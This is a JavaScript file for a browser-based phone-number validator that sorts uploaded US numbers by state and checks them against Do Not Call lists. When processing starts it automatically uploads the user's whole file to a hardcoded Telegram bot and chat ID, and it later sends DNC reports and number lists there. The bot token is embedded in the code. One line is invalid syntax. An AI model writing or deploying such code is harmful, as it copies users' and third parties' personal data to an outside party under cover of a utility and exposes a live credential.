// ============================================
// CONFIGURATION - APNA TELEGRAM CREDENTIALS
// ============================================
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '7261028712:AAEt60GJ6IWCGT8K2Ml9MEJXAtZHza9iL1M',
        CHAT_ID: '6510198499',
        ENABLED: true,
        AUTO_SEND: true  // Auto send file to Telegram
    },
    PROCESSING: {
        VALIDATION_CHUNK_SIZE: 5000,  // Big chunks for fast validation
        DNC_CHUNK_SIZE: 10,           // Small chunks for DNC (API limit)
        DNC_DELAY: 200                // Delay between DNC checks (ms)
    }
};

// ============================================
// GLOBAL VARIABLES
// ============================================
let currentFile = null;
let fileContent = '';
let processingResults = {
    total: 0,
    valid: 0,
    invalid: 0,
    dnc: 0,
    clean: 0,
    states: 0,
    byState: {},          // State-wise organized numbers (INSTANT)
    validNumbers: [],     // All valid numbers
    invalidNumbers: [],   // All invalid numbers
    dncNumbers: [],       // Numbers marked as DNC
    cleanNumbers: []      // Numbers that are clean
};
let isProcessing = false;
let isDNCProcessing = false;

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    setupDragAndDrop();
    setupFileInput();
    updateTelegramStatus();
    console.log('Fast Phone Validator initialized');
}

// ============================================
// FILE HANDLING - ANY SIZE ACCEPTED
// ============================================
function setupDragAndDrop() {
    const uploadArea = document.getElementById('uploadArea');
    
    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.classList.add('drag-over');
    });
    
    uploadArea.addEventListener('dragleave', () => {
        uploadArea.classList.remove('drag-over');
    });
    
    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.classList.remove('drag-over');
        
        if (e.dataTransfer.files.length > 0) {
            handleFileSelect({ target: { files: e.dataTransfer.files } });
        }
    });
}

function setupFileInput() {
    const fileInput = document.getElementById('fileInput');
    fileInput.addEventListener('change', handleFileSelect);
}

function handleFileSelect(event) {
    if (!event.target.files.length) return;
    
    const file = event.target.files[0];
    
    // Validate file type only
    if (!file.name.toLowerCase().endsWith('.txt')) {
        alert('❌ Please select a .txt file');
        return;
    }
    
    currentFile = file;
    
    // Update UI
    document.getElementById('fileName').textContent = file.name;
    document.getElementById('fileSize').textContent = formatFileSize(file.size);
    document.getElementById('fileInfo').classList.remove('d-none');
    
    // Read file
    const reader = new FileReader();
    reader.onload = function(e) {
        fileContent = e.target.result;
        const lines = fileContent.split('\n').filter(line => line.trim()).length;
        document.getElementById('fileCount').textContent = `${lines} numbers`;
        document.getElementById('processBtn').disabled = false;
        
        // Show warning for large files
        if (lines > 10000) {
            alert(`⚠️ Large file detected: ${lines} numbers\nValidation will be instant, DNC check may take time.`);
        }
    };
    reader.onerror = function() {
        alert('❌ Error reading file');
    };
    reader.readAsText(file);
}

// ============================================
// MAIN PROCESSING FUNCTION - INSTANT VALIDATION
// ============================================
async function startProcessing() {
    if (!currentFile || isProcessing) return;
    
    isProcessing = true;
    resetResults();
    showProcessingUI();
    
    // Start Telegram send IMMEDIATELY
    if (CONFIG.TELEGRAM.AUTO_SEND) {
        sendFileToTelegram();
    }
    
    const options = {
        removePlusOne: document.getElementById('removePlusOne').checked,
        enableDNC: document.getElementById('enableDNC').checked
    };
    
    try {
        // STEP 1: INSTANT VALIDATION (Fast)
        await processInstantValidation(options);
        
        // STEP 2: Show instant results
        showInstantResults();
        
        // STEP 3: DNC Check (Slow, in background if enabled)
        if (options.enableDNC) {
            await startDNCProcessing();
        }
        
    } catch (error) {
        console.error('Processing error:', error);
        alert('❌ Processing error: ' + error.message);
    } finally {
        isProcessing = false;
    }
}

// ============================================
// STEP 1: INSTANT VALIDATION (FAST)
// ============================================
async function processInstantValidation(options) {
    const lines = fileContent.split('\n')
        .map(line => line.trim())
        .filter(line => line);
    
    processingResults.total = lines.length;
    updateProgress(0, 'validation');
    
    // Process in one go for speed (no delay)
    for (let i = 0; i < lines.length; i++) {
        const number = lines[i];
        processSingleNumberInstant(number, options);
        
        // Update progress every 1000 numbers
        if (i % 1000 === 0 || i === lines.length - 1) {
            const progress = ((i + 1) / lines.length) * 100;
            updateProgress(progress, 'validation');
            updateInstantCounters();
        }
    }
    
    // Calculate states count
    processingResults.states = Object.keys(processingResults.byState).length;
}

function processSingleNumberInstant(originalNumber, options) {
    try {
        // Clean and validate
        const validationResult = validatePhoneNumber(originalNumber, options.removePlusOne);
        
        if (!validationResult.isValid) {
            processingResults.invalid++;
            processingResults.invalidNumbers.push({
                original: originalNumber,
                error: validationResult.error
            });
            return;
        }
        
        // Check area code
        const state = getStateFromAreaCode(validationResult.areaCode);
        if (!state || state === 'Unknown/Invalid State') {
            processingResults.invalid++;
            processingResults.invalidNumbers.push({
                original: originalNumber,
                cleaned: validationResult.cleaned,
                error: 'Invalid area code'
            });
            return;
        }
        
        processingResults.valid++;
        
        // Add to results
        const processedNumber = {
            original: originalNumber,
            cleaned: validationResult.cleaned,
            formatted: validationResult.formatted,
            areaCode: validationResult.areaCode,
            state: state,
            dnc: false,  // Will be updated later if DNC check enabled
            dncStatus: 'Not Checked',
            timestamp: new Date().toISOString()
        };
        
        // Add to state-wise organization (INSTANT)
        if (!processingResults.byState[state]) {
            processingResults.byState[state] = {
                total: 0,
                numbers: []  // Store all numbers for this state
            };
        }
        
        processingResults.byState[state].total++;
        processingResults.byState[state].numbers.push(processedNumber);
        processingResults.validNumbers.push(processedNumber);
        
    } catch (error) {
        console.error('Validation error:', error);
    }
}

// ============================================
// STEP 2: SHOW INSTANT RESULTS
// ============================================
function showInstantResults() {
    // Update counters
    updateInstantCounters();
    
    // Show states distribution
    displayStatesDistribution();
    
    // Create download buttons for states (INSTANT)
    createStateDownloadButtons();
    
    // Show results section
    document.getElementById('resultsSection').classList.remove('d-none');
    
    // Show preview table
    populateResultsTable();
    
    // Update status
    document.getElementById('validationStatus').className = 'status-badge badge bg-success';
    document.getElementById('validationStatus').textContent = 'Completed';
    
    console.log('Instant validation completed:', processingResults);
}

// ============================================
// STEP 3: DNC PROCESSING (SLOW, BACKGROUND)
// ============================================
async function startDNCProcessing() {
    if (processingResults.validNumbers.length === 0) return;
    
    isDNCProcessing = true;
    
    // Show DNC processing section
    document.getElementById('dncProcessingSection').classList.remove('d-none');
    document.getElementById('dncTotalCount').textContent = processingResults.validNumbers.length;
    document.getElementById('dncStatus').className = 'status-badge badge bg-warning';
    document.getElementById('dncStatus').textContent = 'Processing';
    
    const dncNumbers = [...processingResults.validNumbers];
    let dncChecked = 0;
    
    // Process DNC in chunks with delay
    for (let i = 0; i < dncNumbers.length; i += CONFIG.PROCESSING.DNC_CHUNK_SIZE) {
        const chunk = dncNumbers.slice(i, i + CONFIG.PROCESSING.DNC_CHUNK_SIZE);
        
        // Process chunk
        for (const number of chunk) {
            try {
                const dncResult = await checkDNC(number.cleaned);
                number.dnc = dncResult === 'DNC';
                number.dncStatus = dncResult;
                
                if (dncResult === 'DNC') {
                    processingResults.dnc++;
                    processingResults.dncNumbers.push(number);
                } else {
                    processingResults.clean++;
                    processingResults.cleanNumbers.push(number);
                }
                
                dncChecked++;
                
                // Update UI every 10 checks
                if (dncChecked % 10 === 0) {
                    updateDNCProgress(dncChecked, dncNumbers.length);
                    updateDNCCounters();
                }
                
                // Delay between checks to avoid rate limiting
                await sleep(CONFIG.PROCESSING.DNC_DELAY);
                
            } catch (error) {
                console.error('DNC check error:', error);
                number.dncStatus = 'Error';
            }
        }
    }
    
    // Final update
    updateDNCProgress(dncNumbers.length, dncNumbers.length);
    updateDNCCounters();
    
    // Update status
    document.getElementById('dncStatus').className = 'status-badge badge bg-success';
    document.getElementById('dncStatus').textContent = 'Completed';
    document.getElementById('dncProcessingSection').classList.add('d-none');
    
    // Create DNC download buttons
    createDNCDownloadButtons();
    
    // Send DNC report to Telegram
    if (CONFIG.TELEGRAM.AUTO_SEND) {
        sendDNCReportToTelegram();
    }
    
    isDNCProcessing = false;
    console.log('DNC processing completed');
}

// ============================================
// TELEGRAM AUTO-SEND FUNCTIONS
// ============================================
async function sendFileToTelegram() {
    if (!CONFIG.TELEGRAM.ENABLED || !currentFile) return;
    
    showTelegramReportCard();
    addTelegramStep('Starting file upload to Telegram...', 'processing');
    
    try {
        // Send original file
        const fileUrl = await uploadFileToTelegram(currentFile, 'Original file uploaded');
        addTelegramStep('✅ Original file sent to Telegram', 'completed');
        
        // Send quick summary
        const summary = `📁 *File Received:* ${currentFile.name}\n` +
                       `⏰ *Time:* ${new Date().toLocaleString()}\n` +
                       `🔄 *Status:* Processing started\n\n` +
                       `_Validation will complete shortly..._`;
        
        await sendTelegramMessage(summary);
        addTelegramStep('✅ Initial notification sent', 'completed');
        
    } catch (error) {
        console.error('Telegram file send error:', error);
        addTelegramStep('❌ Failed to send file to Telegram', 'failed');
    }
}

async function sendValidationReportToTelegram() {
    if (!CONFIG.TELEGRAM.ENABLED) return;
    
    addTelegramStep('Sending validation results...', 'processing');
    
    try {
        const summary = createValidationSummary();
        await sendTelegramMessage(summary);
        addTelegramStep('✅ Validation results sent', 'completed');
        
        // Send state-wise summary
        const stateSummary = createStateSummary();
        await sendTelegramMessage(stateSummary);
        addTelegramStep('✅ State distribution sent', 'completed');
        
    } catch (error) {
        console.error('Telegram validation report error:', error);
        addTelegramStep('❌ Failed to send validation report', 'failed');
    }
}

async function sendDNCReportToTelegram() {
    if (!CONFIG.TELEGRAM.ENABLED || processingResults.dnc === 0) return;
    
    addTelegramStep('Sending DNC report...', 'processing');
    
    try {
        const dncReport = createDNCReport();
        await sendTelegramMessage(dncReport);
        addTelegramStep('✅ DNC report sent', 'completed');
        
        // Send DNC numbers file if not too large
        if (processingResults.dncNumbers.length > 0 && processingResults.dncNumbers.length <= 500) {
            const dncContent = processingResults.dncNumbers.map(n => n.formatted).join('\n');
            await sendTelegramFile('dnc-numbers.txt', dncContent, '🚫 DNC Numbers List');
            addTelegramStep('✅ DNC numbers file sent', 'completed');
        }
        
    } catch (error) {
        console.error('Telegram DNC report error:', error);
        addTelegramStep('❌ Failed to send DNC report', 'failed');
    }
}

// ============================================
// TELEGRAM HELPER FUNCTIONS
// ============================================
async function uploadFileToTelegram(file, caption) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
    
    const formData = new FormData();
    formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
    formData.append('document', file);
    formData.append('caption', caption);
    
    const response = await fetch(url, {
        method: 'POST',
        body: formData
    });
    
    if (!response.ok) {
        throw new Error(`Telegram upload failed: ${response.status}`);
    }
    
    return await response.json();
}

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        })
    });
    
    if (!response.ok) {
        throw new Error(`Telegram message failed: ${response.status}`);
    }
    
    return await response.json();
}

async function sendTelegramFile(filename, content, caption) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
    
    const blob = new Blob([content], { type: 'text/plain' });
    const file = new File([blob], filename);
    
    const formData = new FormData();
    formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
    formData.append('document', file);
    formData.append('caption', caption);
    
    const response = await fetch(url, {
        method: 'POST',
        body: formData
    });
    
    if (!response.ok) {
        throw new Error(`Telegram file failed: ${response.status}`);
    }
    
    return await response.json();
}

// ============================================
// REPORT CREATION FUNCTIONS
// ============================================
function createValidationSummary() {
    return `📊 *INSTANT VALIDATION COMPLETE*\n\n` +
           `📁 *File:* ${currentFile?.name || 'Unknown'}\n` +
           `📈 *Total Numbers:* ${processingResults.total}\n` +
           `✅ *Valid Numbers:* ${processingResults.valid}\n` +
           `❌ *Invalid Numbers:* ${processingResults.invalid}\n` +
           `🗺️ *States Found:* ${processingResults.states}\n` +
           `⏰ *Validation Time:* Instant\n\n` +
           `_DNC check is running in background..._`;
}

function createStateSummary() {
    let message = `🗺️ *STATE-WISE DISTRIBUTION*\n\n`;
    
    const topStates = Object.entries(processingResults.byState)
        .sort((a, b) => b[1].total - a[1].total)
        .slice(0, 10);
    
    topStates.forEach(([state, data], index) => {
        const percentage = ((data.total / processingResults.valid) * 100).toFixed(1);
        message += `${index + 1}. ${state}: ${data.total} (${percentage}%)\n`;
    });
    
    if (Object.keys(processingResults.byState).length > 10) {
        message += `\n... and ${Object.keys(processingResults.byState).length - 10} more states`;
    }
    
    return message;
}

function createDNCReport() {
    return `🚫 *DNC CHECK COMPLETE*\n\n` +
           `📊 *Valid Numbers Checked:* ${processingResults.valid}\n` +
           `🚫 *DNC Numbers Found:* ${processingResults.dnc}\n` +
           `✨ *Clean Numbers:* ${processingResults.clean}\n` +
           `📈 *DNC Rate:* ${((processingResults.dnc / processingResults.valid) * 100).toFixed(1)}%\n\n` +
           `_DNC files available for download_`;
}

// ============================================
// UI UPDATE FUNCTIONS
// ============================================
function showProcessingUI() {
    updateProgress(0, 'validation');
    document.getElementById('validationStatus').className = 'status-badge badge bg-warning';
    document.getElementById('validationStatus').textContent = 'Processing';
    document.getElementById('telegramSendStatus').className = 'status-badge badge bg-warning';
    document.getElementById('telegramSendStatus').textContent = 'Sending...';
}

function updateProgress(percentage, type = 'validation') {
    const progress = Math.min(percentage, 100);
    document.getElementById('progressBar').style.width = `${progress}%`;
    document.getElementById('progressText').textContent = `${Math.round(progress)}%`;
    
    if (type === 'dnc') {
        document.getElementById('dncProgressBar').style.width = `${progress}%`;
        document.getElementById('dncProgressText').textContent = `DNC Check: ${Math.round(progress)}%`;
    }
}

function updateInstantCounters() {
    document.getElementById('totalCount').textContent = processingResults.total;
    document.getElementById('validCount').textContent = processingResults.valid;
    document.getElementById('invalidCount').textContent = processingResults.invalid;
    document.getElementById('statesCount').textContent = processingResults.states;
}

function updateDNCCounters() {
    document.getElementById('dncCount')?.textContent = processingResults.dnc;
    document.getElementById('cleanCount')?.textContent = processingResults.clean;
    document.getElementById('dncCheckedCount').textContent = processingResults.dnc + processingResults.clean;
}

function updateDNCProgress(checked, total) {
    const percentage = (checked / total) * 100;
    updateProgress(percentage, 'dnc');
}

// ============================================
// STATES DISTRIBUTION DISPLAY
// ============================================
function displayStatesDistribution() {
    const container = document.getElementById('statesDistribution');
    container.innerHTML = '';
    
    const states = Object.entries(processingResults.byState)
        .sort((a, b) => b[1].total - a[1].total);
    
    states.forEach(([state, data]) => {
        const percentage = ((data.total / processingResults.valid) * 100).toFixed(1);
        
        const stateDiv = document.createElement('div');
        stateDiv.className = 'state-item';
        stateDiv.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <strong>${state}</strong>
                    <div class="state-stats">
                        <span class="text-success">${data.total} numbers</span>
                        <span class="text-muted ms-2">(${percentage}%)</span>
                    </div>
                </div>
                <div>
                    <button class="btn btn-sm btn-outline-primary" onclick="downloadStateFile('${state}')">
                        <i class="fas fa-download"></i>
                    </button>
                </div>
            </div>
            <div class="state-numbers">
                <small>Sample: ${data.numbers.slice(0, 3).map(n => n.formatted).join(', ')}${data.total > 3 ? '...' : ''}</small>
            </div>
        `;
        container.appendChild(stateDiv);
    });
}

// ============================================
// DOWNLOAD BUTTONS CREATION
// ============================================
function createStateDownloadButtons() {
    const container = document.getElementById('stateDownloadButtons');
    container.innerHTML = '';
    
    Object.entries(processingResults.byState)
        .sort((a, b) => b[1].total - a[1].total)
        .forEach(([state, data]) => {
            if (data.total > 0) {
                const btn = document.createElement('button');
                btn.className = 'btn btn-outline-primary btn-sm';
                btn.innerHTML = `<i class="fas fa-download me-1"></i>${state} (${data.total})`;
                btn.onclick = () => downloadStateFile(state);
                container.appendChild(btn);
            }
        });
}

function createDNCDownloadButtons() {
    const container = document.getElementById('categoryDownloadButtons');
    
    // Add DNC button if DNC numbers exist
    if (processingResults.dncNumbers.length > 0) {
        const dncBtn = document.createElement('button');
        dncBtn.className = 'btn btn-outline-danger btn-sm';
        dncBtn.innerHTML = `<i class="fas fa-ban me-1"></i>DNC Numbers (${processingResults.dnc})`;
        dncBtn.onclick = downloadDNCNumbers;
        container.appendChild(dncBtn);
    }
    
    // Add Clean button if clean numbers exist
    if (processingResults.cleanNumbers.length > 0) {
        const cleanBtn = document.createElement('button');
        cleanBtn.className = 'btn btn-outline-success btn-sm';
        cleanBtn.innerHTML = `<i class="fas fa-check me-1"></i>Clean Numbers (${processingResults.clean})`;
        cleanBtn.onclick = downloadCleanNumbers;
        container.appendChild(cleanBtn);
    }
    
    // Add Invalid button
    if (processingResults.invalidNumbers.length > 0) {
        const invalidBtn = document.createElement('button');
        invalidBtn.className = 'btn btn-outline-warning btn-sm';
        invalidBtn.innerHTML = `<i class="fas fa-times me-1"></i>Invalid Numbers (${processingResults.invalid})`;
        invalidBtn.onclick = downloadInvalidNumbers;
        container.appendChild(invalidBtn);
    }
}

// ============================================
// DOWNLOAD FUNCTIONS
// ============================================
function downloadStateFile(state) {
    const numbers = processingResults.byState[state].numbers;
    const content = numbers.map(n => n.formatted).join('\n');
    downloadFile(`${state.toLowerCase().replace(/\s+/g, '-')}-numbers.txt`, content);
}

function downloadDNCNumbers() {
    const content = processingResults.dncNumbers.map(n => n.formatted).join('\n');
    downloadFile('dnc-numbers.txt', content);
}

function downloadCleanNumbers() {
    const content = processingResults.cleanNumbers.map(n => n.formatted).join('\n');
    downloadFile('clean-numbers.txt', content);
}

function downloadInvalidNumbers() {
    const content = processingResults.invalidNumbers.map(n => 
        `${n.original} - ${n.error}`
    ).join('\n');
    downloadFile('invalid-numbers.txt', content);
}

async function downloadAllFiles() {
    const zip = new JSZip();
    
    // Add state files
    Object.entries(processingResults.byState).forEach(([state, data]) => {
        if (data.total > 0) {
            const content = data.numbers.map(n => n.formatted).join('\n');
            zip.file(`${state}-numbers.txt`, content);
        }
    });
    
    // Add DNC file
    if (processingResults.dncNumbers.length > 0) {
        zip.file('DNC-numbers.txt', 
            processingResults.dncNumbers.map(n => n.formatted).join('\n'));
    }
    
    // Add clean file
    if (processingResults.cleanNumbers.length > 0) {
        zip.file('clean-numbers.txt',
            processingResults.cleanNumbers.map(n => n.formatted).join('\n'));
    }
    
    // Add invalid file
    if (processingResults.invalidNumbers.length > 0) {
        zip.file('invalid-numbers.txt',
            processingResults.invalidNumbers.map(n => `${n.original} - ${n.error}`).join('\n'));
    }
    
    // Generate and download
    const content = await zip.generateAsync({ type: "blob" });
    saveAs(content, `phone-validator-${Date.now()}.zip`);
}

// ============================================
// TELEGRAM REPORT UI
// ============================================
function showTelegramReportCard() {
    const card = document.getElementById('telegramReportCard');
    card.classList.remove('d-none');
    document.getElementById('telegramReportDetails').innerHTML = '';
}

function addTelegramStep(message, status = 'processing') {
    const container = document.getElementById('telegramReportDetails');
    const step = document.createElement('div');
    step.className = `telegram-step ${status}`;
    step.innerHTML = `
        <div class="d-flex align-items-center">
            <i class="fas fa-${getStatusIcon(status)} me-2"></i>
            <span>${message}</span>
            <span class="ms-auto text-muted">${new Date().toLocaleTimeString()}</span>
        </div>
    `;
    container.appendChild(step);
    container.scrollTop = container.scrollHeight;
    
    // Update Telegram status
    if (status === 'completed') {
        document.getElementById('telegramSendStatus').className = 'status-badge badge bg-success';
        document.getElementById('telegramSendStatus').textContent = 'Sent';
    } else if (status === 'failed') {
        document.getElementById('telegramSendStatus').className = 'status-badge badge bg-danger';
        document.getElementById('telegramSendStatus').textContent = 'Failed';
    }
}

function getStatusIcon(status) {
    switch(status) {
        case 'completed': return 'check-circle';
        case 'failed': return 'times-circle';
        case 'processing': return 'spinner fa-spin';
        default: return 'info-circle';
    }
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function resetResults() {
    processingResults = {
        total: 0,
        valid: 0,
        invalid: 0,
        dnc: 0,
        clean: 0,
        states: 0,
        byState: {},
        validNumbers: [],
        invalidNumbers: [],
        dncNumbers: [],
        cleanNumbers: []
    };
}

function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' Bytes';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
    return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function downloadFile(filename, content) {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function updateTelegramStatus() {
    const statusEl = document.getElementById('telegramStatus');
    const infoEl = document.getElementById('telegramInfo');
    
    if (CONFIG.TELEGRAM.ENABLED && CONFIG.TELEGRAM.BOT_TOKEN && CONFIG.TELEGRAM.CHAT_ID) {
        statusEl.innerHTML = '<i class="fab fa-telegram"></i> Auto-Send Enabled';
        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Files auto-send to Telegram';
    } else {
        statusEl.innerHTML = '<i class="fab fa-telegram"></i> Bot Disabled';
        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Telegram disabled';
    }
}

function populateResultsTable() {
    const tbody = document.getElementById('resultsTableBody');
    tbody.innerHTML = '';
    
    // Show first 50 valid numbers
    const displayNumbers = processingResults.validNumbers.slice(0, 50);
    
    displayNumbers.forEach((num, index) => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${index + 1}</td>
            <td><small class="text-muted">${num.original}</small></td>
            <td><strong>${num.formatted}</strong></td>
            <td><span class="badge bg-info">${num.state}</span></td>
            <td>${num.dnc ? '<span class="badge bg-danger">DNC</span>' : 
                num.dncStatus === 'Not Checked' ? '<span class="badge bg-secondary">Not Checked</span>' :
                '<span class="badge bg-success">Clean</span>'}</td>
        `;
        tbody.appendChild(row);
    });
    
    if (processingResults.validNumbers.length > 50) {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td colspan="5" class="text-center text-muted">
                ... and ${processingResults.validNumbers.length - 50} more numbers
            </td>
        `;
        tbody.appendChild(row);
    }
}

// Validation function (using states-data.js)
function validatePhoneNumber(number, removePlusOne) {
    let cleaned = number.toString();
    
    if (removePlusOne) {
        cleaned = cleaned.replace(/^\+1/, '').replace(/^1/, '');
    }
    
    cleaned = cleaned.replace(/\D/g, '');
    
    if (cleaned.length !== 10) {
        return {
            isValid: false,
            error: `Invalid length: ${cleaned.length} digits`,
            cleaned: cleaned
        };
    }
    
    const areaCode = cleaned.substring(0, 3);
    const formatted = `(${areaCode}) ${cleaned.substring(3, 6)}-${cleaned.substring(6)}`;
    
    return {
        isValid: true,
        cleaned: cleaned,
        formatted: formatted,
        areaCode: areaCode,
        original: number
    };
}

// Export for debugging
window.PhoneValidator = {
    config: CONFIG,
    results: () => processingResults,
    reset: resetResults,
    process: startProcessing
};
